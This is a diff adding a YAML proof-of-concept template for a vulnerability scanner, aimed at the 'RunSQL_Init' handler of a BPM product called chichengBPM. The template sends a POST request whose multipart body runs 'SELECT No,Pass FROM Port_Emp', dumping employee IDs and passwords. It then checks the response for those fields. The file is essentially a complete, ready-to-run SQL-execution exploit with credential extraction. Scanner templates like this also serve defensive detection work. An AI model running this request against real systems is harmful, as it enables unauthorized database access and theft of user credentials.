@@ -1,0 +1,27 @@
+name: poc-yaml-chichengBPM-RunSQL_Init-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /WF/Comm/Handler.ashx?DoType=RunSQL_Init
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+      body: "-----------------------------142851345723692939351758052805\r\n\
+        Content-Disposition: form-data; name=\"SQL\"\r\n\
+        \r\n\
+        SELECT No,Pass FROM Port_Emp\r\n\
+        -----------------------------142851345723692939351758052805--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'"No"') && response.body.bcontains(b'"Pass"') || response.status == 200 && response.body.bcontains(b'"NO"') && response.body.bcontains(b'"PASS"')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486274&idx=1&sn=637dbf1b180de408ffad82996d459ebc&chksm=c267be71f5103767984d0b0e341e32b0016a6364ea04cb91febb4147d55f257ccd5873a26a38&token=1742030890&lang=zh_CN#rd
+
+
